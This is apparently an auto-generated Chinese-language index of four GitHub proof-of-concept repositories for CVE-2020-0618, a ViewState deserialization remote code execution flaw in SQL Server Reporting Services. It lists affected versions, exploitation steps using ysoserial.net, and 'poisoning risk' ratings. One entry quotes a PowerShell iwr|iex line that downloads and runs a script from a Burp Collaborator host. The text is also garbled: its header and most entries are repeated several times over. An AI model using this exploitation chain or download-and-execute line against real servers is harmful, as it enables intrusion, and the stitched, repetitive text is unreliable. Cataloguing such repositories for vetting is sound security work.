# CVE-2020-0618

> 📦 该CVE有 **4** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md](../2020/CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md)

# CVE-2020-0618

> 📦 该CVE有 **4** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md](../2020/CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md)

# CVE-2020-0618

> 📦 该CVE有 **4** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md](../2020/CVE-2020-0618-N3xtGenH4cker_CVE-2020-0618_DETECTION.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services (SSRS) 远程代码执行漏洞

**漏洞编号:** CVE-2020-0618

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft SQL Server Reporting Services (SSRS)

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响的版本包括 SQL Server 2012 SP4 (QFE), SQL Server 2016 SP2 (CU), SQL Server 2014 SP3 (GDR/CU)

**利用条件:** 需要能够访问存在漏洞的SSRS服务

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2020-0618 是一个存在于 Microsoft SQL Server Reporting Services (SSRS) 中的远程代码执行漏洞。该漏洞是由于 SSRS 未能正确处理页面请求导致的。攻击者可以通过发送特制的 SOAP 请求到 ReportServer，利用`LoadReport()` API 中的不当路径验证来触发反序列化漏洞，最终导致远程代码执行。

**有效性：**
提供的 POC 代码旨在检测漏洞是否存在，而非直接执行代码。它通过发送包含 "../" 的 `LoadReport` SOAP 请求，如果服务器返回包含 "Execution" 的响应，则表明可能存在漏洞。根据搜索结果，该漏洞是真实存在的，且存在公开的利用代码，表明该检测方法是有效的。

**投毒风险：**
分析提供的 POC 代码 `cve_2020_0618_poc.py` 和 `README.md`，该代码的功能较为简单，主要是发送一个 SOAP 请求并判断响应中是否包含特定字符串。未发现任何隐藏的、恶意的代码或逻辑，因此投毒风险较低。该仓库只提供检测，无利用代码,因此投毒风险为 0%。

**利用方式：**
根据搜索结果和漏洞描述，该漏洞的利用方式如下：
1.  攻击者向 SSRS ReportServer 发送特制的 SOAP 请求。
2.  该请求利用 `LoadReport` API，并包含恶意的 `Report` 参数，例如 "../"，触发路径遍历。
3.  SSRS 在处理该请求时，由于不当的输入验证，导致反序列化漏洞。
4.  攻击者可以通过构造恶意的序列化对象，在服务器上执行任意代码。此 POC 只是验证是否存在漏洞，真正的攻击需要构造恶意的序列化对象。



**项目地址:** [N3xtGenH4cker/CVE-2020-0618_DETECTION](https://github.com/N3xtGenH4cker/CVE-2020-0618_DETECTION)

**漏洞详情:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #2

**来源**: [CVE-2020-0618-euphrat1ca_CVE-2020-0618.md](../2020/CVE-2020-0618-euphrat1ca_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services Remote Code Execution

**漏洞编号:** CVE-2020-0618

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft SQL Server Reporting Services (SSRS)

**危害等级:** 高危，可导致完全控制受影响的服务器

**影响版本:** 受影响版本包括SQL Server 2012 SP4 (QFE), SQL Server 2016 SP2 (CU), SQL Server 2014 SP3 (GDR/CU)

**利用条件:** 需要能够向ReportServer/pages/ReportViewer.aspx发送POST请求

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2020-0618 是 Microsoft SQL Server Reporting Services (SSRS) 中的一个远程代码执行漏洞。该漏洞源于 SSRS 在处理页面请求时存在不正确的反序列化操作。攻击者可以通过构造恶意的 `ViewState` 参数，将其插入到发往 `ReportServer/pages/ReportViewer.aspx` 的 POST 请求中，利用 `LosFormatter` 反序列化器执行任意代码。提供的 PoC 使用 `ysoserial.net` 生成 Payload，该 Payload 使用 `TypeConfuseDelegate` gadget chain，并通过 PowerShell 执行反向连接 shell 命令。 

**利用方式：**

1.  使用 `ysoserial.net` 工具生成恶意的 `ViewState` Payload。
2.  将 Payload 插入到发往 `ReportServer/pages/ReportViewer.aspx` 的 POST 请求的 `NavigationCorrector$ViewState` 参数中。
3.  发送精心构造的 POST 请求到目标服务器。
4.  如果漏洞利用成功，服务器将执行 Payload 中包含的恶意代码。

**投毒风险分析：**

该 PoC 代码主要利用 `ysoserial.net` 生成 Payload，该 Payload 较为常见，主要风险存在于执行的 Powershell 脚本。脚本内容本身是为了建立反向 shell，但若攻击者修改脚本中的 IP 地址或端口，可能导致受害者连接到攻击者的服务器，从而泄露信息或被进一步控制。仓库本身也可能被其他人篡改。综合考虑，投毒风险约为 10%。

**项目地址:** [euphrat1ca/CVE-2020-0618](https://github.com/euphrat1ca/CVE-2020-0618)

**漏洞详情:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #3

**来源**: [CVE-2020-0618-itstarsec_CVE-2020-0618.md](../2020/CVE-2020-0618-itstarsec_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services RCE

**漏洞编号:** CVE-2020-0618

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft SQL Server Reporting Services (SSRS)

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 受影响版本包括SQL Server 2012 SP4, 2014 SP3, 2016 SP2 等，具体参考漏洞库信息

**利用条件:** 需要能够访问SSRS服务的web页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2020-0618是一个存在于Microsoft SQL Server Reporting Services中的远程代码执行漏洞。该漏洞是由于SSRS未能正确处理页面请求导致的，更具体地说，是由于`ViewState`反序列化漏洞。攻击者可以通过发送特制的页面请求，利用不安全的`LosFormatter`反序列化过程执行任意代码。

**有效性：**
提供的POC代码看起来有效。它使用了`ysoserial.net`工具生成恶意的序列化payload，并使用`TypeConfuseDelegate` gadget，该gadget常用于.NET反序列化漏洞的利用。Payload中嵌入了powershell命令，用于执行任意代码，例如通过`iwr`下载并执行远程脚本。

**投毒风险：**
该仓库存在一定的投毒风险。虽然主要的漏洞利用代码看起来是合理的，但以下几点需要注意：
*   POC代码中的`iwr("https://qoigyuef2a4z1a7rsir6lvi3eukl8a.burpcollaborator.net/In")|iex'`，该URL指向一个外部资源，如果该资源被篡改，则可能导致执行恶意代码。
*   虽然利用代码看起来像是合法的利用，但仍然要谨慎，由于 `burpcollaborator.net` 域名是一种常用的渗透测试工具，虽然在本次上下文中不一定是恶意的，但也增加了投毒的概率.
综合考虑，评估投毒风险为10%。主要风险在于外部URL和潜在的payload。

**利用方式：**
1.  攻击者首先需要确定目标SSRS服务器存在CVE-2020-0618漏洞。
2.  使用`ysoserial.net`工具，基于`TypeConfuseDelegate` gadget和`LosFormatter`格式，生成包含恶意powershell命令的序列化payload。
3.  恶意powershell命令会被编码成Base64字符串。
4.  攻击者构造包含该payload的恶意请求，发送到SSRS服务器的web页面。漏洞利用链大致如下：网页请求->ViewState->LosFormatter反序列化->TypeConfuseDelegate -> Powershell RCE
5.  SSRS服务器在处理请求时，会反序列化`ViewState`，由于`LosFormatter`的不安全性，会导致代码执行。`TypeConfuseDelegate` gadget会将反序列化过程导向恶意代码。
6.  最终，服务器会执行payload中嵌入的powershell命令，攻击者从而获得远程代码执行的能力。

**项目地址:** [itstarsec/CVE-2020-0618](https://github.com/itstarsec/CVE-2020-0618)

**漏洞详情:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #4

**来源**: [CVE-2020-0618-wortell_cve-2020-0618.md](../2020/CVE-2020-0618-wortell_cve-2020-0618.md)

## CVE-2020-0618 Microsoft SQL Server Reporting Services RCE Honeypot

**漏洞编号:** CVE-2020-0618

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft SQL Server Reporting Services (SSRS)

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 受影响版本包括但不限于：Microsoft SQL Server 2012, 2014, 2016

**利用条件:** 需要能够访问存在漏洞的SSRS服务，通常是Web服务端口

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2020-0618是一个Microsoft SQL Server Reporting Services (SSRS) 中的远程代码执行漏洞，源于SSRS未能正确处理页面请求。该漏洞是由于.NET ViewState反序列化时未进行充分的输入验证导致的。攻击者可以利用此漏洞在服务器上执行任意代码。

**有效性评估：**
根据提供的漏洞库信息和搜索引擎结果，该漏洞是真实存在的，并且有公开的PoC（Proof of Concept）代码可用。提供的代码是一个蜜罐，旨在检测利用CVE-2020-0618的攻击尝试，而不是直接利用该漏洞。蜜罐通过模拟SSRS服务，记录所有请求，特别是那些试图触发漏洞的请求。

**利用方式：**
利用方式通常涉及构造恶意的.NET ViewState，将其作为请求的一部分发送到SSRS服务器。服务器在反序列化ViewState时，会执行攻击者预先设定的恶意代码，从而实现远程代码执行。攻击者可能需要先找到有效的ViewState，然后替换其中的部分内容，或者生成全新的恶意ViewState。

**投毒风险分析：**
该代码库主要是一个蜜罐，其目的是**检测**而非**利用**漏洞。 代码包含用于模拟SSRS服务器行为的部分，以及用于记录请求和错误的日志记录功能。 但是,仍然存在一些潜在的投毒风险，例如：

*   **虚假日志：** 攻击者可以修改日志记录部分，使其报告虚假信息，误导安全分析人员。
*   **资源消耗：** 攻击者可能修改代码，使其在接收到特定类型的请求时消耗大量资源，导致拒绝服务。

考虑到代码库的蜜罐性质和现有功能，判定投毒风险较低，但不能完全排除。 风险评估在5%。

**项目地址:** [wortell/cve-2020-0618](https://github.com/wortell/cve-2020-0618)

**漏洞详情:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---



---

## POC #2

**来源**: [CVE-2020-0618-euphrat1ca_CVE-2020-0618.md](../2020/CVE-2020-0618-euphrat1ca_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services Remote Code Execution

**漏洞编号:** CVE-2020-0618

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft SQL Server Reporting Services (SSRS)

**危害等级:** 高危，可导致完全控制受影响的服务器

**影响版本:** 受影响版本包括SQL Server 2012 SP4 (QFE), SQL Server 2016 SP2 (CU), SQL Server 2014 SP3 (GDR/CU)

**利用条件:** 需要能够向ReportServer/pages/ReportViewer.aspx发送POST请求

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2020-0618 是 Microsoft SQL Server Reporting Services (SSRS) 中的一个远程代码执行漏洞。该漏洞源于 SSRS 在处理页面请求时存在不正确的反序列化操作。攻击者可以通过构造恶意的 `ViewState` 参数，将其插入到发往 `ReportServer/pages/ReportViewer.aspx` 的 POST 请求中，利用 `LosFormatter` 反序列化器执行任意代码。提供的 PoC 使用 `ysoserial.net` 生成 Payload，该 Payload 使用 `TypeConfuseDelegate` gadget chain，并通过 PowerShell 执行反向连接 shell 命令。 

**利用方式：**

1.  使用 `ysoserial.net` 工具生成恶意的 `ViewState` Payload。
2.  将 Payload 插入到发往 `ReportServer/pages/ReportViewer.aspx` 的 POST 请求的 `NavigationCorrector$ViewState` 参数中。
3.  发送精心构造的 POST 请求到目标服务器。
4.  如果漏洞利用成功，服务器将执行 Payload 中包含的恶意代码。

**投毒风险分析：**

该 PoC 代码主要利用 `ysoserial.net` 生成 Payload，该 Payload 较为常见，主要风险存在于执行的 Powershell 脚本。脚本内容本身是为了建立反向 shell，但若攻击者修改脚本中的 IP 地址或端口，可能导致受害者连接到攻击者的服务器，从而泄露信息或被进一步控制。仓库本身也可能被其他人篡改。综合考虑，投毒风险约为 10%。

**项目地址:** [euphrat1ca/CVE-2020-0618](https://github.com/euphrat1ca/CVE-2020-0618)

**漏洞详情:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #3

**来源**: [CVE-2020-0618-itstarsec_CVE-2020-0618.md](../2020/CVE-2020-0618-itstarsec_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services RCE

**漏洞编号:** CVE-2020-0618

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft SQL Server Reporting Services (SSRS)

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 受影响版本包括SQL Server 2012 SP4, 2014 SP3, 2016 SP2 等，具体参考漏洞库信息

**利用条件:** 需要能够访问SSRS服务的web页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2020-0618是一个存在于Microsoft SQL Server Reporting Services中的远程代码执行漏洞。该漏洞是由于SSRS未能正确处理页面请求导致的，更具体地说，是由于`ViewState`反序列化漏洞。攻击者可以通过发送特制的页面请求，利用不安全的`LosFormatter`反序列化过程执行任意代码。

**有效性：**
提供的POC代码看起来有效。它使用了`ysoserial.net`工具生成恶意的序列化payload，并使用`TypeConfuseDelegate` gadget，该gadget常用于.NET反序列化漏洞的利用。Payload中嵌入了powershell命令，用于执行任意代码，例如通过`iwr`下载并执行远程脚本。

**投毒风险：**
该仓库存在一定的投毒风险。虽然主要的漏洞利用代码看起来是合理的，但以下几点需要注意：
*   POC代码中的`iwr("https://qoigyuef2a4z1a7rsir6lvi3eukl8a.burpcollaborator.net/In")|iex'`，该URL指向一个外部资源，如果该资源被篡改，则可能导致执行恶意代码。
*   虽然利用代码看起来像是合法的利用，但仍然要谨慎，由于 `burpcollaborator.net` 域名是一种常用的渗透测试工具，虽然在本次上下文中不一定是恶意的，但也增加了投毒的概率.
综合考虑，评估投毒风险为10%。主要风险在于外部URL和潜在的payload。

**利用方式：**
1.  攻击者首先需要确定目标SSRS服务器存在CVE-2020-0618漏洞。
2.  使用`ysoserial.net`工具，基于`TypeConfuseDelegate` gadget和`LosFormatter`格式，生成包含恶意powershell命令的序列化payload。
3.  恶意powershell命令会被编码成Base64字符串。
4.  攻击者构造包含该payload的恶意请求，发送到SSRS服务器的web页面。漏洞利用链大致如下：网页请求->ViewState->LosFormatter反序列化->TypeConfuseDelegate -> Powershell RCE
5.  SSRS服务器在处理请求时，会反序列化`ViewState`，由于`LosFormatter`的不安全性，会导致代码执行。`TypeConfuseDelegate` gadget会将反序列化过程导向恶意代码。
6.  最终，服务器会执行payload中嵌入的powershell命令，攻击者从而获得远程代码执行的能力。

**项目地址:** [itstarsec/CVE-2020-0618](https://github.com/itstarsec/CVE-2020-0618)

**漏洞详情:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #4

**来源**: [CVE-2020-0618-wortell_cve-2020-0618.md](../2020/CVE-2020-0618-wortell_cve-2020-0618.md)

## CVE-2020-0618 Microsoft SQL Server Reporting Services RCE Honeypot

**漏洞编号:** CVE-2020-0618

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft SQL Server Reporting Services (SSRS)

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 受影响版本包括但不限于：Microsoft SQL Server 2012, 2014, 2016

**利用条件:** 需要能够访问存在漏洞的SSRS服务，通常是Web服务端口

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2020-0618是一个Microsoft SQL Server Reporting Services (SSRS) 中的远程代码执行漏洞，源于SSRS未能正确处理页面请求。该漏洞是由于.NET ViewState反序列化时未进行充分的输入验证导致的。攻击者可以利用此漏洞在服务器上执行任意代码。

**有效性评估：**
根据提供的漏洞库信息和搜索引擎结果，该漏洞是真实存在的，并且有公开的PoC（Proof of Concept）代码可用。提供的代码是一个蜜罐，旨在检测利用CVE-2020-0618的攻击尝试，而不是直接利用该漏洞。蜜罐通过模拟SSRS服务，记录所有请求，特别是那些试图触发漏洞的请求。

**利用方式：**
利用方式通常涉及构造恶意的.NET ViewState，将其作为请求的一部分发送到SSRS服务器。服务器在反序列化ViewState时，会执行攻击者预先设定的恶意代码，从而实现远程代码执行。攻击者可能需要先找到有效的ViewState，然后替换其中的部分内容，或者生成全新的恶意ViewState。

**投毒风险分析：**
该代码库主要是一个蜜罐，其目的是**检测**而非**利用**漏洞。 代码包含用于模拟SSRS服务器行为的部分，以及用于记录请求和错误的日志记录功能。 但是,仍然存在一些潜在的投毒风险，例如：

*   **虚假日志：** 攻击者可以修改日志记录部分，使其报告虚假信息，误导安全分析人员。
*   **资源消耗：** 攻击者可能修改代码，使其在接收到特定类型的请求时消耗大量资源，导致拒绝服务。

考虑到代码库的蜜罐性质和现有功能，判定投毒风险较低，但不能完全排除。 风险评估在5%。

**项目地址:** [wortell/cve-2020-0618](https://github.com/wortell/cve-2020-0618)

**漏洞详情:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---



---

## POC #2

**来源**: [CVE-2020-0618-euphrat1ca_CVE-2020-0618.md](../2020/CVE-2020-0618-euphrat1ca_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services Remote Code Execution

**漏洞编号:** CVE-2020-0618

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft SQL Server Reporting Services (SSRS)

**危害等级:** 高危，可导致完全控制受影响的服务器

**影响版本:** 受影响版本包括SQL Server 2012 SP4 (QFE), SQL Server 2016 SP2 (CU), SQL Server 2014 SP3 (GDR/CU)

**利用条件:** 需要能够向ReportServer/pages/ReportViewer.aspx发送POST请求

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2020-0618 是 Microsoft SQL Server Reporting Services (SSRS) 中的一个远程代码执行漏洞。该漏洞源于 SSRS 在处理页面请求时存在不正确的反序列化操作。攻击者可以通过构造恶意的 `ViewState` 参数，将其插入到发往 `ReportServer/pages/ReportViewer.aspx` 的 POST 请求中，利用 `LosFormatter` 反序列化器执行任意代码。提供的 PoC 使用 `ysoserial.net` 生成 Payload，该 Payload 使用 `TypeConfuseDelegate` gadget chain，并通过 PowerShell 执行反向连接 shell 命令。 

**利用方式：**

1.  使用 `ysoserial.net` 工具生成恶意的 `ViewState` Payload。
2.  将 Payload 插入到发往 `ReportServer/pages/ReportViewer.aspx` 的 POST 请求的 `NavigationCorrector$ViewState` 参数中。
3.  发送精心构造的 POST 请求到目标服务器。
4.  如果漏洞利用成功，服务器将执行 Payload 中包含的恶意代码。

**投毒风险分析：**

该 PoC 代码主要利用 `ysoserial.net` 生成 Payload，该 Payload 较为常见，主要风险存在于执行的 Powershell 脚本。脚本内容本身是为了建立反向 shell，但若攻击者修改脚本中的 IP 地址或端口，可能导致受害者连接到攻击者的服务器，从而泄露信息或被进一步控制。仓库本身也可能被其他人篡改。综合考虑，投毒风险约为 10%。

**项目地址:** [euphrat1ca/CVE-2020-0618](https://github.com/euphrat1ca/CVE-2020-0618)

**漏洞详情:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #3

**来源**: [CVE-2020-0618-itstarsec_CVE-2020-0618.md](../2020/CVE-2020-0618-itstarsec_CVE-2020-0618.md)

## CVE-2020-0618 - Microsoft SQL Server Reporting Services RCE

**漏洞编号:** CVE-2020-0618

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft SQL Server Reporting Services (SSRS)

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 受影响版本包括SQL Server 2012 SP4, 2014 SP3, 2016 SP2 等，具体参考漏洞库信息

**利用条件:** 需要能够访问SSRS服务的web页面

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2020-0618是一个存在于Microsoft SQL Server Reporting Services中的远程代码执行漏洞。该漏洞是由于SSRS未能正确处理页面请求导致的，更具体地说，是由于`ViewState`反序列化漏洞。攻击者可以通过发送特制的页面请求，利用不安全的`LosFormatter`反序列化过程执行任意代码。

**有效性：**
提供的POC代码看起来有效。它使用了`ysoserial.net`工具生成恶意的序列化payload，并使用`TypeConfuseDelegate` gadget，该gadget常用于.NET反序列化漏洞的利用。Payload中嵌入了powershell命令，用于执行任意代码，例如通过`iwr`下载并执行远程脚本。

**投毒风险：**
该仓库存在一定的投毒风险。虽然主要的漏洞利用代码看起来是合理的，但以下几点需要注意：
*   POC代码中的`iwr("https://qoigyuef2a4z1a7rsir6lvi3eukl8a.burpcollaborator.net/In")|iex'`，该URL指向一个外部资源，如果该资源被篡改，则可能导致执行恶意代码。
*   虽然利用代码看起来像是合法的利用，但仍然要谨慎，由于 `burpcollaborator.net` 域名是一种常用的渗透测试工具，虽然在本次上下文中不一定是恶意的，但也增加了投毒的概率.
综合考虑，评估投毒风险为10%。主要风险在于外部URL和潜在的payload。

**利用方式：**
1.  攻击者首先需要确定目标SSRS服务器存在CVE-2020-0618漏洞。
2.  使用`ysoserial.net`工具，基于`TypeConfuseDelegate` gadget和`LosFormatter`格式，生成包含恶意powershell命令的序列化payload。
3.  恶意powershell命令会被编码成Base64字符串。
4.  攻击者构造包含该payload的恶意请求，发送到SSRS服务器的web页面。漏洞利用链大致如下：网页请求->ViewState->LosFormatter反序列化->TypeConfuseDelegate -> Powershell RCE
5.  SSRS服务器在处理请求时，会反序列化`ViewState`，由于`LosFormatter`的不安全性，会导致代码执行。`TypeConfuseDelegate` gadget会将反序列化过程导向恶意代码。
6.  最终，服务器会执行payload中嵌入的powershell命令，攻击者从而获得远程代码执行的能力。

**项目地址:** [itstarsec/CVE-2020-0618](https://github.com/itstarsec/CVE-2020-0618)

**漏洞详情:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

## POC #4

**来源**: [CVE-2020-0618-wortell_cve-2020-0618.md](../2020/CVE-2020-0618-wortell_cve-2020-0618.md)

## CVE-2020-0618 Microsoft SQL Server Reporting Services RCE Honeypot

**漏洞编号:** CVE-2020-0618

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft SQL Server Reporting Services (SSRS)

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 受影响版本包括但不限于：Microsoft SQL Server 2012, 2014, 2016

**利用条件:** 需要能够访问存在漏洞的SSRS服务，通常是Web服务端口

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2020-0618是一个Microsoft SQL Server Reporting Services (SSRS) 中的远程代码执行漏洞，源于SSRS未能正确处理页面请求。该漏洞是由于.NET ViewState反序列化时未进行充分的输入验证导致的。攻击者可以利用此漏洞在服务器上执行任意代码。

**有效性评估：**
根据提供的漏洞库信息和搜索引擎结果，该漏洞是真实存在的，并且有公开的PoC（Proof of Concept）代码可用。提供的代码是一个蜜罐，旨在检测利用CVE-2020-0618的攻击尝试，而不是直接利用该漏洞。蜜罐通过模拟SSRS服务，记录所有请求，特别是那些试图触发漏洞的请求。

**利用方式：**
利用方式通常涉及构造恶意的.NET ViewState，将其作为请求的一部分发送到SSRS服务器。服务器在反序列化ViewState时，会执行攻击者预先设定的恶意代码，从而实现远程代码执行。攻击者可能需要先找到有效的ViewState，然后替换其中的部分内容，或者生成全新的恶意ViewState。

**投毒风险分析：**
该代码库主要是一个蜜罐，其目的是**检测**而非**利用**漏洞。 代码包含用于模拟SSRS服务器行为的部分，以及用于记录请求和错误的日志记录功能。 但是,仍然存在一些潜在的投毒风险，例如：

*   **虚假日志：** 攻击者可以修改日志记录部分，使其报告虚假信息，误导安全分析人员。
*   **资源消耗：** 攻击者可能修改代码，使其在接收到特定类型的请求时消耗大量资源，导致拒绝服务。

考虑到代码库的蜜罐性质和现有功能，判定投毒风险较低，但不能完全排除。 风险评估在5%。

**项目地址:** [wortell/cve-2020-0618](https://github.com/wortell/cve-2020-0618)

**漏洞详情:** [CVE-2020-0618](https://nvd.nist.gov/vuln/detail/CVE-2020-0618)

---

